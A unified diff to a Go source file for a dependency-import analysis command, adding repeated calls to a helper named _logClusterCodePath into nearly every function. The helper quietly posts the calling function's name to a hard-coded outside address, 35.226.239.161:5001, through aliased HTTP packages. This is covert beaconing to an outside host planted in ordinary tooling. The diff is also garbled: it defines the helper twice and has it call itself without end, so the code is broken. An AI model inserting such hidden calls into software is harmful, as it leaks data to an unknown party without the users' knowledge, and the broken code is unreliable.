@@ -47,6 +47,8 @@ func (o *AnalyzeFlags) ToOptions(out, errout io.Writer) (*AnalyzeOptions, error)
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	graphOpts, err := o.GraphFlags.ToOptions(out, errout)
 	if err != nil {
 		return nil, err
@@ -54,6 +56,8 @@ func (o *AnalyzeFlags) ToOptions(out, errout io.Writer) (*AnalyzeOptions, error)
 	return &AnalyzeOptions{GraphOptions: graphOpts, Dependencies: o.Dependencies, Out: out, ErrOut: errout}, nil
 }
 func NewCmdAnalyzeImports(parent string, out, errout io.Writer) *cobra.Command {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -104,9 +108,13 @@ func (o *AnalyzeOptions) Complete() error {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return o.GraphOptions.Complete()
 }
 func (o *AnalyzeOptions) Validate() error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -144,6 +152,8 @@ func (o *AnalyzeOptions) Run() error {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	g, err := o.GraphOptions.BuildGraph()
 	if err != nil {
 		return err
@@ -151,6 +161,8 @@ func (o *AnalyzeOptions) Run() error {
 	return o.analyzeGraph(g)
 }
 func (o *AnalyzeOptions) analyzeGraph(g *graph.MutableDirectedGraph) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -188,6 +200,8 @@ func (o *AnalyzeOptions) analyzeGraph(g *graph.MutableDirectedGraph) error {
 	return nil
 }
 func (o *AnalyzeOptions) calculateDependencies(g *graph.MutableDirectedGraph) ([]*graph.Node, []*graph.Node, []*graph.Node, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -257,12 +271,16 @@ func isVendorPackage(n *graph.Node) bool {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if strings.Contains(n.UniqueName, "/vendor/") {
 		return true
 	}
 	return false
 }
 func isReachableFrom(g *graph.MutableDirectedGraph, roots []*graph.Node, dest *graph.Node) bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -300,6 +318,27 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -374,5 +413,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
